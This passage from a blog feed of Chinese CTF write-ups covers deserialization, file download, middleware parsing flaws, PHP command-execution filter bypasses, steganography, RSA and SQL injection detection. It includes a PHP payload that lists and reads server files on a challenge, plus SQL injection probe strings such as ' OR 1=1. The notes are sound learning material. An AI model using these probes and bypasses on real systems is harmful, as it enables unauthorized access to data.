<p><img src="/2023/01/07/%E4%B8%80%E9%81%93%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1670060263796-9ff717b3-9e0c-4029-9cd4-cacfcb72b556.png" alt="img"></p>
<p>base64解密后</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL &amp; ~E_NOTICE);</span><br><span class="line"><span class="comment">//flag&#123;hSh_ctf:e@syt0g3t&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>下载漏洞</title>
    <url>/2023/01/07/%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p><img src="/2023/01/07/%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/1669683675716-f18bc2ba-a42a-4d5b-b82c-801f7ce4454f.png" alt="img"></p>
<span id="more"></span>

<p>随即点击一个图片下载</p>
<p>查看下载地址</p>
<p><img src="/2023/01/07/%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/1669683714398-272eb1f2-03b7-4cf1-a5c5-4b26e7d7af32.png" alt="img"></p>
<p>再随机下载一个图片</p>
<p>查看地址</p>
<p><img src="/2023/01/07/%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/1669683750235-349e7187-884b-4e63-893c-d7428e584a09.png" alt="img"></p>
<p>对比地址发现filename以后的文件名不同，其余相同</p>
<p>我们可以得到filename后面可以任意查看文件的信息</p>
<p>可以构造payload</p>
]]></content>
      <categories>
        <category>下载漏洞</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>中间件解析漏洞</title>
    <url>/2023/01/07/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="中间件解析漏洞"><a href="#中间件解析漏洞" class="headerlink" title="中间件解析漏洞"></a>中间件解析漏洞</h1><h2 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h2><p><img src="/2023/01/07/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/1672991978769-39972392-a80a-4411-9353-09781546a0ef.png" alt="img"></p>
<span id="more"></span>

<p><img src="/2023/01/07/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/1672991990540-ee07383b-fc4d-48f2-812e-714f3bb36f42.png" alt="img"></p>
<p><img src="/2023/01/07/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/1672992001298-b4969176-ee94-4d68-97de-1e8413905d54.png" alt="img"></p>
<h2 id="nginx解析漏洞"><a href="#nginx解析漏洞" class="headerlink" title="nginx解析漏洞"></a>nginx解析漏洞</h2><p><img src="/2023/01/07/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/1672992030577-44b73883-b1ea-4812-9ef9-2b18001c978e.png" alt="img"></p>
<p><img src="/2023/01/07/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/1672992045955-6c942af6-38a0-47c4-a2d6-01e84c5242ea.png" alt="img"></p>
<p><img src="/2023/01/07/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/1672992058788-e44e178e-4e7a-42ac-8ad8-4446041a8d05.png" alt="img"></p>
<h2 id="iis解析漏洞"><a href="#iis解析漏洞" class="headerlink" title="iis解析漏洞"></a>iis解析漏洞</h2><p><img src="/2023/01/07/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/1672992101004-31965220-7e77-4bd8-a969-cca485f4141b.png" alt="img"></p>
]]></content>
      <categories>
        <category>文件上传</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>命令执行绕过总结</title>
    <url>/2023/01/07/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>  <img src="https://g.csdnimg.cn/static/logo/favicon32.ico" alt="img"><a href="https://blog.csdn.net/qq_44110340/article/details/107532395">命令执行绕过总结_半只特立独行的猪的博客-CSDN博客_命令执行绕过</a> </p>
<p>php函数操作：<br>scandir(’.’):扫描当前目录<br>localeconv() 函数返回一数组。而数组第一项就是<code>.</code>(用来绕过.过滤)<br>pos(),current():返回数组第一个值<br>print_r(scandir(‘.’)); 查看当前目录下的所有文件名</p>
<span id="more"></span>

<p>数组操作函数：<br>end():数组指针指向最后一位<br>next() 将数组中的内部指针向前移动一位<br>prev() 将数组中的内部指针倒回一位<br>array_reverse(): 将数组颠倒<br>array_rand(): 随机返回数组的键名<br>array_flip()：交换数组的键和值</p>
<p>读取文件函数<br>file_get_content() :因为et被ban，所以不能使用<br>readfile()<br>highlight_file()<br>show_source()</p>
<p>另解：c=print_r(scandir(pos(localeconv())));</p>
<p>查看当前目录所有文件</p>
<p>c=show_source(next(array_reverse(scandir(pos(localeconv())))));</p>
<p>读取当前目录倒数第二个文件，得出flag</p>
]]></content>
      <categories>
        <category>命令执行</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>(图片分离+brainfuck编码+Ook！编码)记一道BUUCTF misc中的一题</title>
    <url>/2023/01/07/%E5%9B%BE%E7%89%87%E5%88%86%E7%A6%BB-brainfuck%E7%BC%96%E7%A0%81-Ook%EF%BC%81%E7%BC%96%E7%A0%81-%E8%AE%B0%E4%B8%80%E9%81%93BUUCTF-misc%E4%B8%AD%E7%9A%84%E4%B8%80%E9%A2%98/</url>
    <content><![CDATA[<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E5%88%86%E7%A6%BB-brainfuck%E7%BC%96%E7%A0%81-Ook%EF%BC%81%E7%BC%96%E7%A0%81-%E8%AE%B0%E4%B8%80%E9%81%93BUUCTF-misc%E4%B8%AD%E7%9A%84%E4%B8%80%E9%A2%98/1668317904292-463d646d-4db3-4931-8c8f-20506af3c92b.png" alt="img"></p>
<span id="more"></span>

<p>打开压缩包有一张图片</p>
<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E5%88%86%E7%A6%BB-brainfuck%E7%BC%96%E7%A0%81-Ook%EF%BC%81%E7%BC%96%E7%A0%81-%E8%AE%B0%E4%B8%80%E9%81%93BUUCTF-misc%E4%B8%AD%E7%9A%84%E4%B8%80%E9%A2%98/1668317934316-13b4f41a-64ae-4ebb-be4e-f7fe7c13c559.png" alt="img"></p>
<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E5%88%86%E7%A6%BB-brainfuck%E7%BC%96%E7%A0%81-Ook%EF%BC%81%E7%BC%96%E7%A0%81-%E8%AE%B0%E4%B8%80%E9%81%93BUUCTF-misc%E4%B8%AD%E7%9A%84%E4%B8%80%E9%A2%98/1668317947746-81a343d7-73cf-4ff8-94ca-15752df1dd37.png" alt="img"></p>
<p>题目名字是面具下的flag，我想了一下，戴面具估计就是为了隐藏，所以猜测这个图片隐藏了其他文件</p>
<p>winhex打开一探究竟</p>
<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E5%88%86%E7%A6%BB-brainfuck%E7%BC%96%E7%A0%81-Ook%EF%BC%81%E7%BC%96%E7%A0%81-%E8%AE%B0%E4%B8%80%E9%81%93BUUCTF-misc%E4%B8%AD%E7%9A%84%E4%B8%80%E9%A2%98/1668318080413-6c4207de-54e3-443d-af6b-223fbf3c8f5d.png" alt="img"></p>
<p>结尾处的50 4B 01 02 是zip压缩包的开头</p>
<p>用binwalk查看有几个文件</p>
<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E5%88%86%E7%A6%BB-brainfuck%E7%BC%96%E7%A0%81-Ook%EF%BC%81%E7%BC%96%E7%A0%81-%E8%AE%B0%E4%B8%80%E9%81%93BUUCTF-misc%E4%B8%AD%E7%9A%84%E4%B8%80%E9%A2%98/1668318162791-a0fc616b-eea7-415d-a3b4-1a095d622449.png" alt="img"></p>
<p>foremost分离文件</p>
<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E5%88%86%E7%A6%BB-brainfuck%E7%BC%96%E7%A0%81-Ook%EF%BC%81%E7%BC%96%E7%A0%81-%E8%AE%B0%E4%B8%80%E9%81%93BUUCTF-misc%E4%B8%AD%E7%9A%84%E4%B8%80%E9%A2%98/1668318238421-92e328a6-a3f0-4af9-ac4e-be4767ba9a03.png" alt="img"></p>
<p>这里output有之前分离的文件。我们先将他们删除</p>
<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E5%88%86%E7%A6%BB-brainfuck%E7%BC%96%E7%A0%81-Ook%EF%BC%81%E7%BC%96%E7%A0%81-%E8%AE%B0%E4%B8%80%E9%81%93BUUCTF-misc%E4%B8%AD%E7%9A%84%E4%B8%80%E9%A2%98/1668318298715-badebc33-c438-4fb4-83d1-9a7adda02665.png" alt="img"></p>
<p>用rm -r +路径 删除</p>
<p>之后再来分离</p>
<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E5%88%86%E7%A6%BB-brainfuck%E7%BC%96%E7%A0%81-Ook%EF%BC%81%E7%BC%96%E7%A0%81-%E8%AE%B0%E4%B8%80%E9%81%93BUUCTF-misc%E4%B8%AD%E7%9A%84%E4%B8%80%E9%A2%98/1668318360454-805a0d70-52c3-40d1-a669-ed969dba4b2f.png" alt="img"></p>
<p>此时output文件夹中多了三个文件</p>
<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E5%88%86%E7%A6%BB-brainfuck%E7%BC%96%E7%A0%81-Ook%EF%BC%81%E7%BC%96%E7%A0%81-%E8%AE%B0%E4%B8%80%E9%81%93BUUCTF-misc%E4%B8%AD%E7%9A%84%E4%B8%80%E9%A2%98/1668318393214-913a4184-2359-44ec-b4a7-ab5a14456daf.png" alt="img"></p>
<p>文件只能在终端打开</p>
<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E5%88%86%E7%A6%BB-brainfuck%E7%BC%96%E7%A0%81-Ook%EF%BC%81%E7%BC%96%E7%A0%81-%E8%AE%B0%E4%B8%80%E9%81%93BUUCTF-misc%E4%B8%AD%E7%9A%84%E4%B8%80%E9%A2%98/1668318441674-ebe5638c-dd70-47be-9bf3-5e6efa7f09c0.png" alt="img"></p>
<p>00000934.zip就是分离出的压缩包</p>
<p>用unzip命令将其解压</p>
<p>得到flag.vmdk文件</p>
<p>我们再将其解压</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7z x flag.vmdk -o./</span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E5%88%86%E7%A6%BB-brainfuck%E7%BC%96%E7%A0%81-Ook%EF%BC%81%E7%BC%96%E7%A0%81-%E8%AE%B0%E4%B8%80%E9%81%93BUUCTF-misc%E4%B8%AD%E7%9A%84%E4%B8%80%E9%A2%98/1668318484755-e1bdf46e-33ae-40c6-817a-47531d356952.png" alt="img"></p>
<p>然后得到以下几个文件</p>
<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E5%88%86%E7%A6%BB-brainfuck%E7%BC%96%E7%A0%81-Ook%EF%BC%81%E7%BC%96%E7%A0%81-%E8%AE%B0%E4%B8%80%E9%81%93BUUCTF-misc%E4%B8%AD%E7%9A%84%E4%B8%80%E9%A2%98/1668318610081-89eb9d10-ddb8-44dd-a775-102ac3a25dde.png" alt="img"></p>
<p>用tree命令查看</p>
<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E5%88%86%E7%A6%BB-brainfuck%E7%BC%96%E7%A0%81-Ook%EF%BC%81%E7%BC%96%E7%A0%81-%E8%AE%B0%E4%B8%80%E9%81%93BUUCTF-misc%E4%B8%AD%E7%9A%84%E4%B8%80%E9%A2%98/1668318648190-1739fff2-7964-4ee0-85e4-b782f5d02e89.png" alt="img"></p>
<p>一个一个文件查看后发现flag分为两块</p>
<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E5%88%86%E7%A6%BB-brainfuck%E7%BC%96%E7%A0%81-Ook%EF%BC%81%E7%BC%96%E7%A0%81-%E8%AE%B0%E4%B8%80%E9%81%93BUUCTF-misc%E4%B8%AD%E7%9A%84%E4%B8%80%E9%A2%98/1668318719339-f41fdcd8-66cb-4ae2-9e62-ffb9c519efa4.png" alt="img"></p>
<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E5%88%86%E7%A6%BB-brainfuck%E7%BC%96%E7%A0%81-Ook%EF%BC%81%E7%BC%96%E7%A0%81-%E8%AE%B0%E4%B8%80%E9%81%93BUUCTF-misc%E4%B8%AD%E7%9A%84%E4%B8%80%E9%A2%98/1668318730740-33cd1c70-7095-4918-a8e2-5e332a2cbcd6.png" alt="img"></p>
<p>第一块为brainfuck编码，第二块为Ook！编码</p>
<p><a href="https://www.splitbrain.org/services/ook%EF%BC%88%E8%A7%A3%E5%AF%86%E7%BD%91%E5%9D%80%EF%BC%89">https://www.splitbrain.org/services/ook（解密网址）</a></p>
<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E5%88%86%E7%A6%BB-brainfuck%E7%BC%96%E7%A0%81-Ook%EF%BC%81%E7%BC%96%E7%A0%81-%E8%AE%B0%E4%B8%80%E9%81%93BUUCTF-misc%E4%B8%AD%E7%9A%84%E4%B8%80%E9%A2%98/1668318818344-63fdda4f-9286-4bc2-8e08-8c44699a6bec.png" alt="img"></p>
<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E5%88%86%E7%A6%BB-brainfuck%E7%BC%96%E7%A0%81-Ook%EF%BC%81%E7%BC%96%E7%A0%81-%E8%AE%B0%E4%B8%80%E9%81%93BUUCTF-misc%E4%B8%AD%E7%9A%84%E4%B8%80%E9%A2%98/1668318828340-be6fa66a-1032-44cb-8098-29d3961bbf1d.png" alt="img"></p>
<p>拿到flag——–flag{N7F5_AD5_i5_funny!}</p>
<p>这一题比较经典，记录一下。</p>
]]></content>
      <categories>
        <category>图片分离术</category>
      </categories>
      <tags>
        <tag>MISC</tag>
      </tags>
  </entry>
  <entry>
    <title>(图片拼接)NewStarCTF 公开赛赛道week2 MISC Coldwinds&#39;s Desktop(复现)</title>
    <url>/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416306569-9aa5a982-43ef-4972-8d43-89b25e435c4a.png" alt="img"></p>
<span id="more"></span>

<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416338466-2f76193e-583e-499b-8ff3-fa1025aab6e9.png" alt="img"></p>
<p>这是一道拼图题目学要用到的工具有ImageMagick 和kali中的gaps</p>
<p>montage命令使用方法</p>
<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416702284-25fab834-afb5-454c-b114-d3cf8ae15a9f.png" alt="img"></p>
<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416734599-45d36a65-a981-4c46-a7f4-cf7179a87021.png" alt="img"></p>
<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416754918-8efb1efb-f0d5-49ec-8b8a-0f133851f5a8.png" alt="img"></p>
<p>在图片目录cmd输入命令<code>magick montage *.png -tile 16x9 -geometry +0+0 flag.jpg</code></p>
<p>-geometry +0+0   这个命令是使整合图片间隙为0</p>
<p>得到整合图片</p>
<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416814529-465ef053-f3f1-45ce-8307-206a3c3c89c1.jpeg" alt="img"></p>
<p>在kali中使用命令<code>gaps --image=flag.jpg --size=30 --population=144 --generations=64 --save</code></p>
<p>–image 指向拼图的路径</p>
<p>–size 拼图块的像素尺寸</p>
<p>–generations 遗传算法的代的数量</p>
<p>–population 个体数量</p>
<p>–verbose 每一代训练结束后展示最佳结果</p>
<p>–save 将拼图还原为图像</p>
<p>size比较重要，这里影响着图片数量，图片数量要和本来的图片数相等</p>
<p>原文链接：<a href="https://blog.csdn.net/m0_47643893/article/details/113778577">https://blog.csdn.net/m0_47643893/article/details/113778577</a></p>
<p>得到拼图</p>
<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416988841-5b441246-a691-435d-9a19-19db7a378b8f.jpeg" alt="img"></p>
<p>最后ps得到</p>
<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668417012503-9e5c207f-4f14-4614-bf32-8da22bdc2060.jpg" alt="img"></p>
]]></content>
      <categories>
        <category>图片隐写</category>
      </categories>
      <tags>
        <tag>MISC</tag>
      </tags>
  </entry>
  <entry>
    <title>基础RSA</title>
    <url>/2023/01/07/%E5%9F%BA%E7%A1%80RSA/</url>
    <content><![CDATA[<ol>
<li>什么是RSA<br>RSA算法是现今使用最广泛的公钥密码算法，也是号称地球上最安全的加密算法。在了解RSA算法之前，先熟悉下几个术语<br>根据密钥的使用方法，可以将密码分为对称密码和公钥密码<br>对称密码：加密和解密使用同一种密钥的方式<br>公钥密码：加密和解密使用不同的密码的方式，因此公钥密码通常也称为非对称密码。 </li>
<li>RSA加密<br>RSA的加密过程可以使用一个通式来表达 </li>
</ol>
<span id="more"></span>

<p>密文＝明文EmodN<br>密文＝明文EmodN<br>也就是说RSA加密是对明文的E次方后除以N后求余数的过程。就这么简单？对，就是这么简单。<br>从通式可知，只要知道E和N任何人都可以进行RSA加密了，所以说E、N是RSA加密的密钥，也就是说E和N的组合就是公钥，我们用(E,N)来表示公钥</p>
<p>公钥＝(E,N)<br>公钥＝(E,N)<br>不过E和N不并不是随便什么数都可以的，它们都是经过严格的数学计算得出的，关于E和N拥有什么样的要求及其特性后面会讲到。顺便啰嗦一句E是加密（Encryption）的首字母，N是数字（Number）的首字母</p>
<ol>
<li>RSA解密<br>RSA的解密同样可以使用一个通式来表达</li>
</ol>
<p>明文＝密文DmodN<br>明文＝密文DmodN<br>也就是说对密文进行D次方后除以N的余数就是明文，这就是RSA解密过程。知道D和N就能进行解密密文了，所以D和N的组合就是私钥</p>
<p>私钥＝(D,N)<br>私钥＝(D,N)<br>从上述可以看出RSA的加密方式和解密方式是相同的，加密是求“E次方的mod N”;解密是求“D次方的mod N”<br>此处D是解密（Decryption）的首字母；N是数字（Number）的首字母。</p>
<p>小结下</p>
<p>公钥    （E，N）<br>私钥    （D，N）<br>密钥对    （E，D，N）<br>加密<br>密文＝明文EmodN<br>密文＝明文EmodN<br>解密<br>明文＝密文DmodN<br>明文＝密文DmodN<br>\4. 生成密钥对<br>既然公钥是（E，N），私钥是（D，N）所以密钥对即为（E，D，N）但密钥对是怎样生成的？步骤如下：</p>
<p>求N<br>求L（L为中间过程的中间数）<br>求E<br>求D<br>4.1 求N<br>准备两个质数p，q。这两个数不能太小，太小则会容易破解，将p乘以q就是N</p>
<p>N=p∗q<br>N=p∗q<br>4.2 求L<br>L 是 p－1 和 q－1的最小公倍数，可用如下表达式表示</p>
<p>L=lcm（p－1，q－1）<br>L=lcm（p－1，q－1）<br>4.3 求E<br>E必须满足两个条件：E是一个比1大比L小的数，E和L的最大公约数为1<br>用gcd(X,Y)来表示X，Y的最大公约数则E条件如下：</p>
<p>1 &lt; E &lt; L<br>gcd（E，L）=1<br>之所以需要E和L的最大公约数为1是为了保证一定存在解密时需要使用的数D。现在我们已经求出了E和N也就是说我们已经生成了密钥对中的公钥了。</p>
<p>4.4 求D<br>数D是由数E计算出来的。D、E和L之间必须满足以下关系：</p>
<p>1 &lt; D &lt; L<br>E＊D mod L ＝ 1<br>只要D满足上述2个条件，则通过E和N进行加密的密文就可以用D和N进行解密。<br>简单地说条件2是为了保证密文解密后的数据就是明文。<br>现在私钥自然也已经生成了，密钥对也就自然生成了。<br>小结下：</p>
<p>求N    N＝ p ＊ q ；p，q为质数<br>求L    L＝lcm（p－1，q－1） ；L为p－1、q－1的最小公倍数<br>求E    1 &lt; E &lt; L，gcd（E，L）=1；E，L最大公约数为1（E和L互质）<br>求D    1 &lt; D &lt; L，E＊D mod L ＝ 1<br>5 实践下吧<br>我们用具体的数字来实践下RSA的密钥对对生成，及其加解密对全过程。为方便我们使用较小数字来模拟。</p>
<p>5.1 求N<br>我们准备两个很小对质数，<br>p ＝ 17<br>q ＝ 19<br>N ＝ p ＊ q ＝ 323</p>
<p>5.2 求L<br>L ＝ lcm（p－1， q－1）＝ lcm(16，18） ＝ 144<br>144为16和18对最小公倍数</p>
<p>5.3 求E<br>求E必须要满足2个条件：1 &lt; E &lt; L ，gcd（E，L）=1<br>即1 &lt; E &lt; 144，gcd（E，144） ＝ 1<br>E和144互为质数，5显然满足上述2个条件<br>故E ＝ 5</p>
<p>此时公钥=(E，N）＝ （5，323）</p>
<p>5.4 求D<br>求D也必须满足2个条件：1 &lt; D &lt; L，E＊D mod L ＝ 1<br>即1 &lt; D &lt; 144，5 ＊ D mod 144 ＝ 1<br>显然当D＝ 29 时满足上述两个条件<br>1 &lt; 29 &lt; 144<br>5＊29 mod 144 ＝ 145 mod 144 ＝ 1<br>此时私钥＝（D，N）＝（29，323）</p>
<p>5.5 加密<br>准备的明文必须时小于N的数，因为加密或者解密都要mod N其结果必须小于N<br>假设明文 ＝ 123<br>则 密文＝明文EmodN＝1235mod323=225密文＝明文EmodN＝1235mod323=225<br>5.6 解密<br>明文＝密文DmodN＝22529mod323=123明文＝密文DmodN＝22529mod323=123<br>解密后的明文为123。<br><a href="https://blog.csdn.net/dbs1215/article/details/48953589">https://blog.csdn.net/dbs1215/article/details/48953589</a></p>
<p>附上一脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Time : 2022/12/6 10:10</span><br><span class="line"># @Author : 阿伦</span><br><span class="line"># @File : 1</span><br><span class="line"># @Project : py</span><br><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">e = 65537</span><br><span class="line">p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span><br><span class="line">q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span><br><span class="line">n = p * q</span><br><span class="line"># 密文</span><br><span class="line">C = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, (p - 1) * (q - 1))</span><br><span class="line">print(d)</span><br><span class="line"># 求明文</span><br><span class="line">M = pow(C, d, n)  # 快速求幂取模运算</span><br><span class="line">print(M)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>RSA基础</category>
      </categories>
      <tags>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>常用sql注入判断</title>
    <url>/2023/01/07/%E5%B8%B8%E7%94%A8sql%E6%B3%A8%E5%85%A5%E5%88%A4%E6%96%AD/</url>
    <content><![CDATA[<h1 id="‘-OR-1-1"><a href="#‘-OR-1-1" class="headerlink" title="‘ OR 1=1"></a>‘ OR 1=1</h1><p>一般SQL代码中会有这么一段<br>SELECT * FROM TABLENAME WHERE ID = 变量，<br>当通过注入后会变成<br>SELECT * FROM TABLENAME WHERE ID = 变量 OR 1=1;<br>就会使WHERE后面的表达式变成一句可有可无的表达式，与<br>SELECT * FROM TABLENAME相等<br>然后就可以通过这种句式来取得当前数据表中所有的用户信息。</p>
<span id="more"></span>

<h3 id="1）字符型"><a href="#1）字符型" class="headerlink" title="1）字符型"></a>1）字符型</h3><p>当输入的参数x为字符型时，通常sql语句会这样的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id =&#x27;x&#x27; </span><br></pre></td></tr></table></figure>

<p>这种类型我们可以使用and ‘1’=’1 和 and ‘1’=’2来进行测试</p>
<ul>
<li><a href="http://www.xxx.com/ccc.php?id=1%E2%80%99">www.xxx.com/ccc.php?id=1’</a> and ‘1’=’1<br>页面正常，继续下一步</li>
<li><a href="http://www.xxx.com/ccc.php?id=1%E2%80%99">www.xxx.com/ccc.php?id=1’</a> and ‘1’=’2<br>页面报错，则说明存在字符型注入。</li>
<li>原因如下：<br>当输入and ‘1’=‘1的时候，后台执行的语句是</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id=&#x27;x&#x27; and &#x27;1&#x27;=&#x27;1&#x27; </span><br></pre></td></tr></table></figure>

<p>语法正确，逻辑判断正确，返回正确</p>
<p>当输入and ‘1’=‘2的时候，后台执行的语句是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id=&#x27;x&#x27; and &#x27;1&#x27;=&#x27;2&#x27; </span><br></pre></td></tr></table></figure>

<p>语法正确，逻辑判断错误，返回错误</p>
<p>字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。</p>
<h3 id="2）数字型"><a href="#2）数字型" class="headerlink" title="2）数字型"></a>2）数字型</h3><p>当输入的参数x为整型的时候，通常<a href="https://so.csdn.net/so/search?q=sql%E8%AF%AD%E5%8F%A5&spm=1001.2101.3001.7020">sql语句</a>是这样的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id =x </span><br></pre></td></tr></table></figure>

<p>这种类型可以使用经典的and 1=1 and 1=2来判断</p>
<ul>
<li>url地址中输入<a href="http://www.xxxx.com/ccc.php?id=x">www.xxxx.com/ccc.php?id=x</a> and 1=1<br>页面显示正常，继续下一步</li>
<li>url地址中输入<a href="http://www.xxxx.com/ccc.php?id=x">www.xxxx.com/ccc.php?id=x</a> and 1=2<br>页面错误，这说明存在数字型注入。</li>
<li>原因如下：<br>当输入and 1=1时，后台会执行sql语句是</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id =x and 1=1； </span><br></pre></td></tr></table></figure>

<p>没有语法显示错误且，返回正常</p>
<p>当输入and 1=2时，后台会执行sql语句是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id =1 and 1=2; </span><br></pre></td></tr></table></figure>

<p>没有语法错误且，返回错误</p>
<ul>
<li>我们在使用假设：<br>如果是字符型注入的话，我们输入的语句应该会出现这样的状况</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id =&#x27;1 and 1=1&#x27;;  </span><br><span class="line">select * from users where id =&#x27;1 and 1=2&#x27;; </span><br></pre></td></tr></table></figure>

<p>查询语句将and语句全部转换成字符串，并没有进行and的逻辑判断，所以不会出现以上结果，所以这个等式是不成立的。</p>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>常用魔法函数</title>
    <url>/2023/01/07/%E5%B8%B8%E7%94%A8%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0/</url>
